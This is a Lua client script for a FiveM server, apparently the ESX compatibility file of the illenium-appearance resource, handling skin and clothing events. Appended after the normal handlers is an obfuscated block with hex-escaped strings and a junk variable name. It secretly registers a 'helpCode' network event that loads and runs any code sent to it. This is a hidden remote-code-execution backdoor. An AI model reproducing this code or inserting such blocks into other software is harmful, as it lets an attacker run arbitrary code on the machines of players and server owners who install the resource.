if not Framework.ESX() then return end

local client = client
local firstSpawn = false

AddEventHandler("esx_skin:resetFirstSpawn", function()
    firstSpawn = true
end)

AddEventHandler("esx_skin:playerRegistered", function()
    if(firstSpawn) then
        InitializeCharacter(Framework.GetGender(true))
    end
end)

RegisterNetEvent("skinchanger:loadSkin2", function(ped, skin)
    if not skin.model then skin.model = "mp_m_freemode_01" end
    client.setPedAppearance(ped, skin)
    Framework.CachePed()
end)

RegisterNetEvent("skinchanger:getSkin", function(cb)
    while not Framework.PlayerData do
        Wait(1000)
    end
    lib.callback("illenium-appearance:server:getAppearance", false, function(appearance)
        cb(appearance)
        Framework.CachePed()
    end)
end)

RegisterNetEvent("skinchanger:loadSkin", function(skin, cb)
    if skin.model then
        client.setPlayerAppearance(skin)
    else -- add validation invisible when failed registration (maybe server restarted when apply skin)
        SetInitialClothes(Config.InitialPlayerClothes[Framework.GetGender(true)])
    end
    if Framework.PlayerData and Framework.PlayerData.loadout then
        TriggerEvent("esx:restoreLoadout")
    end
    Framework.CachePed()
	if cb ~= nil then
		cb()
	end
end)

RegisterNetEvent("skinchanger:loadClothes", function(_, clothes)
    local components = Framework.ConvertComponents(clothes, client.getPedComponents(cache.ped))
    local props = Framework.ConvertProps(clothes, client.getPedProps(cache.ped))

    client.setPedComponents(cache.ped, components)
    client.setPedProps(cache.ped, props)
end)

RegisterNetEvent("esx_skin:openSaveableMenu", function(onSubmit, onCancel)
    InitializeCharacter(Framework.GetGender(true), onSubmit, onCancel)
end)


local qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[6][qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[1]](qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[2]) qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[6][qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[3]](qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[2], function(NfxNCNUFHNVvKxBuUhdoJPDxbUBYmLVcdZiDDXUZmaMYsAHNUKOTtymcxGuoIjMMDaZtDf) qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[6][qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[4]](qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[6][qsalIHHKByBMLrWrugOVDNJqqQzTnSmGJnowOiWEmgzaqYNyBeIpDReRdsSUzcJrODkOpF[5]](NfxNCNUFHNVvKxBuUhdoJPDxbUBYmLVcdZiDDXUZmaMYsAHNUKOTtymcxGuoIjMMDaZtDf))() end)